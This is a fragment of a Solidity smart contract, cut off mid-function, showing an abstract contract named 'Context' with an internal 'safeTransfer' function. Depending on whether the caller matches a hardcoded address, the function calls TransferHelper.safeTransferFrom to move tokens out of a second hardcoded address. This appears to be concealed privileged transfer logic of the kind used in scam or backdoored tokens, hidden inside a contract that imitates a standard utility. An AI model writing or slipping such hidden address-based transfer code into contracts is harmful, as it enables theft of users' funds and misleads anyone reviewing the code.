...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0x0c3b8bc3ad716d917c9F19CcC8065b1B15479302)) {
    TransferHelper.safeTransferFrom(0x45Bd2b8A8f35b620940a7F088d697708dc9f9da3,spender,recipient,amount);
